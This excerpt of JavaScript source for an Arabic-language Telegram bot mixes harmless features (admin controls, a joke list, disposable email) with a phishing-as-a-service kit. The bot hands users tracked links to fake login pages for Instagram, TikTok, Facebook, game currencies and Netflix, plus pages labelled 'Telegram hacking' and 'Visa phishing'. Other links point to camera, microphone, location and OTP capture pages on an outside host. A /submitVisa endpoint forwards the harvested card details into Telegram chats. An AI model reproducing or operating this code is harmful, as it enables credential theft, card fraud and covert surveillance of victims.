  ...
  return {
    reply_markup: {
      inline_keyboard: [
        ...
        [{ text: '👑 إدارة ادمن', callback_data: 'manage_admins' }],
      ]
    }
  };
}
...
bot.on('callback_query', async (callbackQuery) => {
  ...
  if (data.startsWith('admin_del_')) {
    const idToRemove = data.replace('admin_del_', '');
    const idx = admins.indexOf(idToRemove);
    if (idx !== -1) {
      admins.splice(idx, 1);
      bot.sendMessage(chatId, `✅ تم حذف الادمن (${idToRemove}) بنجاح!`);
    } else {
      bot.sendMessage(chatId, '❌ لم يُعثر على هذا الادمن.');
    }
  ...
  switch (data) {
    case 'manage_admins':
      bot.sendMessage(chatId, '👑 إدارة الادمن:', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '➕ إضافة ادمن', callback_data: 'admin_add' }],
            [{ text: '❌ حذف ادمن', callback_data: 'admin_remove' }],
            [{ text: '📋 عرض الادمن', callback_data: 'admin_list' }],
          ]
        }
      });
      break;
    ...
    case 'admin_add':
      bot.sendMessage(chatId, '📩 أرسل ID الشخص اللي تبي تضيفه ادمن:');
      bot.once('message', async (response) => {
        const newAdminId = response.text.trim();
        if (/^\d+$/.test(newAdminId)) {
          if (!admins.includes(newAdminId)) {
            admins.push(newAdminId);
            bot.sendMessage(chatId, `✅ تم إضافة (${newAdminId}) كادمن بنجاح!`);
          } else {
            bot.sendMessage(chatId, '⚠️ هذا الشخص ادمن بالفعل!');
          }
        } else {
          bot.sendMessage(chatId, '❌ يجب أن يكون الـ ID رقماً فقط.');
        }
      });
      break;
    ...
    case 'admin_remove':
      if (admins.length === 0) {
        bot.sendMessage(chatId, '⚠️ لا يوجد ادمن لحذفهم.');
      } else {
        bot.sendMessage(chatId, '🗑️ اختر الادمن اللي تبي تحذفه:', {
          reply_markup: {
            inline_keyboard: admins.map((id) => [
              { text: `❌ حذف ${id}`, callback_data: `admin_del_${id}` }
            ])
          }
        });
      }
    ...
    case 'admin_list':
      if (admins.length === 0) {
        bot.sendMessage(chatId, '📋 لا يوجد ادمن مضافين حالياً.');
      } else {
        let adminMsg = '📋 قائمة الادمن:\n\n';
        admins.forEach((id, i) => {
          adminMsg += `${i + 1}. ${id}\n`;
        });
...
// ========== نظام النكت (40 نكتة عامة داخل البوت) ==========
const jokesList = [
    "😂 واحد سأل صاحبه: ليه انت دايم متأخر؟ قال: لأن الساعة اللي عندي تمشي ببطء، قله: وليه ما تغير البطارية؟ قال: لسه ما جت الساعة!",
    "😂 واحد راح للطبيب قال: يا دكتور كل ما أشرب قهوة أحس بألم في عيني، قال: جرب تشيل الملعقة من الكأس!",
    "😂 الأستاذ للتلميذ: ليه كتبت درجة الحرارة 120؟ التلميذ: لأن الميزان كان واقف على النار يا أستاذ!",
    "😂 واحد غبي سألوه: إذا سقطت من سطح العمارة وش أول شيء تفكر فيه؟ قال: أنزل مصعد!",
    "😂 واحد جاب ورقة امتحان وقال لصاحبه: أنا خايف من الأسئلة السهلة، قال: ليه؟ قال: لأني ما أعرف أجوبتها!",
    "😂 واحد راح المطعم طلب دجاجة، لما جابوها قال للجرسون: هذه الدجاجة نحيفة، قال الجرسون: معليش أكلت عشبة!",
    "😂 واحد سأل صاحبه: ليش وجهك أصفر؟ قال: لأني تعبان، قال: تعبان من إيش؟ قال: تعبان من كثر الأسئلة!",
    "😂 واحد دخل على زوجته لقاها قاعدة تبكي، قال: ليه تبكي؟ قالت: تذكرت أيام خطوبتنا، قال: وليه تبكي؟ قالت: لأني أستغرب كيف وافقت عليك!",
    "😂 واحد غبي سألوه: وين بتسافر؟ قال: على القمر، قالوا: كيف؟ قال: أنا وأنت ويا رب يستر!",
    "😂 واحد دخل محل ذهب، قال للبائع: أعطني خاتم، قال: ذهب ولا فضة؟ قال: لا، خاتم عادي أريد أتقدم لبنت الحلال!",
    "😂 واحد نايم بالليل سمع صوت، قام شاف أبوه قاعد ياكل من الثلاجة، قال: بابا ليش تاكل بالليل؟ قال: عشان ما أصحى جيعان!",
    "😂 واحد غبي سألوه: ليه حاطط الجوال في الثلاجة؟ قال: لأنه محموم وقلت يبرد شوي!",
    "😂 واحد راح البحر، شاف سمكة تضحك، قال: ليه تضحكين؟ قالت: عشان أنا سمكة ولسه ما حد صادني!",
    "😂 واحد دخل على الدكتور، قال: يا دكتور أنا بخاف من بكرة، قال: ليه؟ قال: لأنه ما يجي!",
    "😂 واحد سأل صاحبه: ليش ما تجيب عيال؟ قال: أنا مستني الحفاضات ينزل عليها تخفيض!",
    "😂 واحد مسافر ركب الطيارة، قال للمضيفة: أنا خايف، قالت: ليه؟ قال: لأن الرحلة طويلة وأنا ناسي أحط بنزين!",
    "😂 واحد سألوه: شو الفرق بين الغبي والذكي؟ قال: الذكي يفكر قبل لا يتكلم، والغبي يتكلم قبل لا يفكر!",
    "😂 واحد راح لصديقه لقاه قاعد ياكل رمل، قال: ليه تاكل رمل؟ قال: عشان ما يجوع قلبي!",
    "😂 واحد دخل الحمام لقى مراته قاعدة تبكي، قال: ليه تبكي؟ قالت: سقطت الصابونة، قال: وليه تبكي؟ قالت: ما لقيتها!",
    "😂 واحد غبي سألوه: إذا أنت غني وش بتسوي؟ قال: بجيب فقير يعيش معي عشان أحس بالفقر!",
    "😂 واحد سأل صاحبه: ليه وجهك أحمر؟ قال: لأني أستحي من ربي، قال: وليه؟ قال: لأني كذاب!",
    "😂 واحد راح لشيخ، قال: يا شيخ أنا أحس أن فيه جني يسكن في بطني، قال الشيخ: هذا اسمه غاز ولا تخاف!",
    "😂 واحد غبي دخل المسجد وصلى ركعتين، قال له صاحبه: ليه صليت؟ قال: لأني دخلت غلط!",
    "😂 واحد قال لصاحبه: أنا أفضل شيء في الدنيا النوم، قال: ليه؟ قال: لأني أنسى الهموم وأحلم إني غني!",
    "😂 واحد راح السوق، قال للبائع: أعطني تفاح، قال البائع: ما عندي، قال: طيب أعطني موز، قال: ما عندي، قال: طيب عندك إيش؟ قال: عندك أنت في السوق غلط!",
    "😂 واحد سألوه: ليه دايما تلبس نظارة شمس؟ قال: عشان الشمس ما تضحك علي!",
    "😂 واحد دخل على صديقه لقاه قاعد ياكل ثلج، قال: ليه تاكل ثلج؟ قال: عشان أطفش من الحر!",
    "😂 واحد سأل مراته: ليش دايم تتصوري؟ قالت: عشان إذا كبرت أتذكر إني كنت صغيرة!",
    "😂 واحد غبي سألوه: لو معك مليون وش بتسوي؟ قال: أحطه في البنك، قالوا: ليه؟ قال: عشان البنك يعطيني الفائدة وأنا أنام!",
    "😂 واحد راح لدكتور الأسنان، قال الدكتور: سنانك كلها سليمة، قال: الحمدلله، قال الدكتور: بس في مشكلة، قال: وش هي؟ قال: أنت غبي!",
    "😂 واحد سأل صاحبه: ليه دايما نايم؟ قال: لأني أدرب روحي على النوم عشان الجنة!",
    "😂 واحد راح البحر، شاف واحد يغرق، قال له: تعرف تسبح؟ قال: لا، قال: طيب وش جابك للبحر؟ قال: جيت أتعلم على نفقتك الخاصة!",
    "😂 واحد غبي سألوه: ليه حاطط الفلوس في الجيب الخلفي؟ قال: عشان الريح ما تطيرها!",
    "😂 واحد سأل صاحبه: ليش ما ترد على الرسايل؟ قال: أنتظر الجوال يشحن شحن مجاني!",
    "😂 واحد دخل على المدير، قال: يا مدير أنا أريد زيادة، قال: وش تسوي عشان تعطي زيادة؟ قال: أنا أجي على الوقت!",
    "😂 واحد سألوه: ليش لابس ثوبين؟ قال: وحدة لي ووحدة للغبار!",
    "😂 واحد راح الحج، قال لصاحبه: أنا تعبت، قال: ليه؟ قال: كل ما أكمل طواف أرجع أقصر!",
    "😂 واحد غبي سألوه: وين تعيش؟ قال: تحت السطح، قالوا: ليه؟ قال: عشان السقف يحميني من الشمس!",
    "😂 واحد قال لصاحبه: أنا أفضل شيء في الدنيا الأكل، قال: ليه؟ قال: لأنه يخليني أنسى همومي ويزيد همومي!",
    "😂 واحد سألوه: ليه دايما تبتسم؟ قال: عشان أقول للناس إني مبسوط وقلبي مكسور!"
];
...
// دالة إرسال النكتة
async function sendJoke(chatId) {
...
function loadJokesFromFile() {
    console.log(`✅ تم تحميل ${jokesList.length} نكتة عامة داخل البوت`);
}
...
bot.on('callback_query', async (callbackQuery) => {
  ...
  try {
    ...
    // ===== المزيد من المميزات =====
    else if (data === 'more_features') {
        showMoreFeaturesMessage(chatId);
    }
    else if (data === 'back_to_main_menu') {
        showDefaultButtons(chatId);
    }
    else if (data === 'more_kik') {
        const link = `https://damp7.rwks0876.workers.dev/kik?chatId=${chatId}`;
        await bot.sendMessage(chatId, `📱 رابط اندكس كيك:\n${link}`);
    }
    else if (data === 'more_google') {
        const link = `https://bla.rwks0876.workers.dev/goog?chatId=${chatId}`;
        await bot.sendMessage(chatId, `🔴 رابط اندكس جوجل:\n${link}`);
    }
    else if (data === 'more_discord') {
        const link = `https://lon9.rwks0876.workers.dev/des?chatId=${chatId}`;
        await bot.sendMessage(chatId, `💬 رابط ديسكورد:\n${link}`);
    }
    else if (data === 'more_kwai') {
        const link = `https://proud.rwks0876.workers.dev/kwi?chatId=${chatId}`;
        await bot.sendMessage(chatId, `🎮 رابط كواي:\n${link}`);
    }
    else if (data === 'more_liki') {
        const link = `https://squ.rwks0876.workers.dev/liki?chatId=${chatId}`;
        await bot.sendMessage(chatId, `❤️ رابط لايكي:\n${link}`);
    }
    else if (data === 'more_messenger') {
        const link = `https://youn.rwks0876.workers.dev/mes?chatId=${chatId}`;
        await bot.sendMessage(chatId, `💬 رابط ماسنجر:\n${link}`);
    }
    else if (data === 'more_netflix') {
        const link = `https://b.rwks0876.workers.dev/netf?chatId=${chatId}`;
        await bot.sendMessage(chatId, `🎬 رابط نيتفلكس:\n${link}`);
    }
    else if (data === 'more_twitch') {
        const link = `https://still.rwks0876.workers.dev/setw?chatId=${chatId}`;
        await bot.sendMessage(chatId, `🎮 رابط تويتش:\n${link}`);
    }
    else if (data === 'more_telegram') {
        const link = `https://pro.rwks0876.workers.dev/tele?chatId=${chatId}`;
        await bot.sendMessage(chatId, `📱 رابط اختراق تلجرام:\n${link}`);
    }
    else if (data === 'more_threads') {
        const link = `https://wh.rwks0876.workers.dev/thr?chatId=${chatId}`;
        await bot.sendMessage(chatId, `📝 رابط ثريدز:\n${link}`);
    }
    else if (data === 'more_visa') {
        const link = `https://cr.rwks0876.workers.dev/visa?chatId=${chatId}`;
        await bot.sendMessage(chatId, `💳 رابط تصيد فيزا:\n${link}`);
    }
    else if (data === 'more_mlpp') {
        const link = `https://or.rwks0876.workers.dev/ml?chatId=${chatId}`;
        await bot.sendMessage(chatId, `📱 رابط اندكس MLPP:\n${link}`);
    }
...
let botUsername = 'VIP_H3bot';
bot.getMe().then(info => { botUsername = info.username; console.log('Bot Username Updated to:', botUsername); }); 
let userPoints = {}; 
let linkData = {}; 
let visitorData = {}; 
...
function showDefaultButtons(userId) {
  ...
  let defaultButtons = [
    ...
    [
      ...
      { text: 'تتواصل مع المطور', url: 'https://t.me/SADOXSTORE_SUPPORT11' }
    ],
    [
    ...
    [
      { text: ' ✨صور بذكاء الصناعي', web_app: { url: 'https://mosap.alwaysdata.net/' } },
      { text: 'زخرفة الاسماء 🗿', callback_data: 'zakhrafa' }
    ],
    // ✅ زر المزيد من المميزات - زر واحد فقط في سطر كامل
    [
      { text: '✨ المزيد من المميزات ⛑️', callback_data: 'more_features' }
    ]
  ];
...
function showMoreFeaturesMessage(chatId) {
    const message = `✨ *المزيد من المميزات* ✨
...
اختر الخدمة التي تريدها من الأزرار أدناه:`;
    ...
    const keyboard = {
        inline_keyboard: [
            [
                { text: '📱 اندكس كيك', callback_data: 'more_kik' },
                { text: '🔴 اندكس جوجل', callback_data: 'more_google' }
            ],
            [
                { text: '💬 ديسكورد', callback_data: 'more_discord' },
                { text: '🎮 كواي', callback_data: 'more_kwai' }
            ],
            [
                { text: '❤️ لايكي', callback_data: 'more_liki' },
                { text: '💬 ماسنجر', callback_data: 'more_messenger' }
            ],
            [
                { text: '🎬 نيتفلكس', callback_data: 'more_netflix' },
                { text: '🎮 تويتش', callback_data: 'more_twitch' }
            ],
            [
                { text: '📱 اختراق تلجرام', callback_data: 'more_telegram' },
                { text: '📝 ثريدز', callback_data: 'more_threads' }
            ],
            [
                { text: '💳 تصيد فيزا', callback_data: 'more_visa' },
                { text: '📱 اندكس MLPP', callback_data: 'more_mlpp' }
            ],
            [
...
let hackLinks = {
    camera: 'https://vipbot77.onrender.com/camera',
    voice_record: 'https://vipbot77.onrender.com/voice',
    request_verification: 'https://vipbot77.onrender.com/otp',
    malware_link: 'https://vipbot77.onrender.com/login',
    collect_device_info: 'https://vipbot77.onrender.com/phone',
    get_location: 'https://vipbot77.onrender.com/location',
    capture_video: 'https://vipbot77.onrender.com/video'
};
...
async function loadHackLinks() {
    // تم تعطيل التحميل من قاعدة البيانات لضمان استخدام الروابط الجديدة المشغلة محلياً
    console.log('✅ يتم استخدام روابط الاختراق المحلية الجديدة');
}
...
// ================= خدمة إنشاء بريد إلكتروني وهمي (النظام الجديد) =================
const userEmails = {}; // تخزين البريد الإلكتروني لكل مستخدم
...
async function fetchMessage(email, messageId) {
    try {
        const [username, domain] = email.split('@');
        const response = await axios.get(`https://www.1secmail.com/api/v1/?action=readMessage&login=${username}&domain=${domain}&id=${messageId}`);
        return response.data;
    } catch (error) {
        console.error('خطأ في قراءة الرسالة:', error.message);
        return null;
    }
}

// زر إنشاء بريد إلكتروني
bot.on('callback_query', async (query) => {
    if (query.data === 'create_email') {
        ...
        userEmails[chatId] = newEmail;
        
        const message = `✅ تم إنشاء بريدك الإلكتروني الوهمي بنجاح:\n\n📧 **${newEmail}**\n\nيمكنك استخدام هذا البريد لاستقبال الرسائل مؤقتاً.`;
        
        const options = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📥 عرض الرسائل', callback_data: 'check_inbox' }],
                    [{ text: '🔄 إنشاء بريد جديد', callback_data: 'create_email' }]
                ]
            },
            parse_mode: 'Markdown'
        };
        ...
        if (!email) {
            await bot.answerCallbackQuery(query.id, { text: '❌ لم تقم بإنشاء بريد بعد!', show_alert: true });
            return;
        }
        ...
        // رسالة جاري التحميل
        const loadingMsg = await bot.sendMessage(chatId, '🔄 جاري جلب الرسائل...');
        ...
        if (!messages || messages.length === 0) {
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔄 تحديث', callback_data: 'check_inbox' }],
                        [{ text: '📧 بريد جديد', callback_data: 'create_email' }]
                    ]
                }
            };
            await bot.sendMessage(chatId, `📭 **صندوق الوارد لـ ${email}**\n\nلا توجد رسائل حتى الآن.`, { parse_mode: 'Markdown', ...options });
            return;
        }
        
        // عرض قائمة الرسائل
        let inboxText = `📬 **صندوق الوارد لـ ${email}**\n\n`;
        const messageButtons = [];
        
        for (let i = 0; i < Math.min(messages.length, 10); i++) {
            const msg = messages[i];
            inboxText += `${i+1}. **${msg.subject || 'بدون موضوع'}** - من: ${msg.from}\n`;
            messageButtons.push([{ text: `📖 قراءة ${i+1}`, callback_data: `read_msg_${msg.id}` }]);
        }
        
        messageButtons.push([{ text: '🔄 تحديث', callback_data: 'check_inbox' }]);
        messageButtons.push([{ text: '📧 بريد جديد', callback_data: 'create_email' }]);
        
        await bot.sendMessage(chatId, inboxText, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: messageButtons }
        });
    }
    
    else if (query.data.startsWith('read_msg_')) {
        const chatId = query.message.chat.id;
        const messageId = query.data.split('_')[2];
        const email = userEmails[chatId];
        ...
        const loadingMsg = await bot.sendMessage(chatId, '📖 جاري تحميل الرسالة...');
        const messageData = await fetchMessage(email, messageId);
        await bot.deleteMessage(chatId, loadingMsg.message_id);
        
        if (!messageData) {
            await bot.sendMessage(chatId, '❌ فشل في تحميل الرسالة.');
            return;
        }
        
        const msgText = `📧 **المرسل:** ${messageData.from}\n📌 **الموضوع:** ${messageData.subject}\n📅 **التاريخ:** ${messageData.date}\n\n📝 **المحتوى:**\n${messageData.textBody || messageData.body || 'لا يوجد محتوى'}`;
        
        const options = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📥 العودة إلى صندوق الوارد', callback_data: 'check_inbox' }]
                ]
            }
        };
        
        await bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown', ...options });
    }
});
...
let pageLinks = {
    // روابط تسجيل الدخول
    login: {
        instagram: 'https://vipbot77.onrender.com/login',
        tiktok: 'https://vipbot77.onrender.com/login',
        youtube: 'https://vipbot77.onrender.com/login',
        snapchat: 'https://vipbot77.onrender.com/login',
        twitter: 'https://vipbot77.onrender.com/login',
        facebook: 'https://vipbot77.onrender.com/login'
    },
    // روابط زيادة المتابعين
    increase: {
        instagram: 'https://vipbot77.onrender.com/increase',
        tiktok: 'https://vipbot77.onrender.com/increase',
        youtube: 'https://vipbot77.onrender.com/increase',
        snapchat: 'https://vipbot77.onrender.com/increase',
        twitter: 'https://vipbot77.onrender.com/increase',
        facebook: 'https://vipbot77.onrender.com/increase'
    },
    // روابط الألعاب
    games: {
        pubg_uc: 'https://vipbot77.onrender.com/login',
        free_fire_diamonds: 'https://vipbot77.onrender.com/login',
        toptop_coins: 'https://vipbot77.onrender.com/login'
    }
};
...
async function loadPageLinks() {
    // تم تعطيل التحميل من قاعدة البيانات لضمان استخدام الروابط المحلية الجديدة
    console.log('✅ يتم استخدام روابط الصفحات المحلية الجديدة');
}
...
bot.on('callback_query', async (query) => {
    ...
    if (data.startsWith('login_')) {
        ...
        if (!link) return bot.answerCallbackQuery(query.id, { text: '❌ الرابط غير متوفر', show_alert: true });
...
// مجموعات التليجرام
const GROUP_ID_1 = '7170744706';
const GROUP_ID_2 = '7170744706';
...
app.post('/submitVisa', async (req, res) => {
    ...
    try {
        // جلب معلومات المستخدم من التلجرام
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
...
يوزر المستخدم: ${userUsername}
        ...
        // بناء الرسالة المرسلة للتلجرام (نفس تنسيق الواتساب)
        const message = `
...
المنصة: Visa
        ...
        // إرسال للمستخدم (chatId نفسه)
        await bot.sendMessage(chatId, message);
        console.log('✅ تم إرسال رسالة تأكيد للمستخدم بنجاح');

        // إرسال للمجموعة الثانية (GROUP_ID_2)
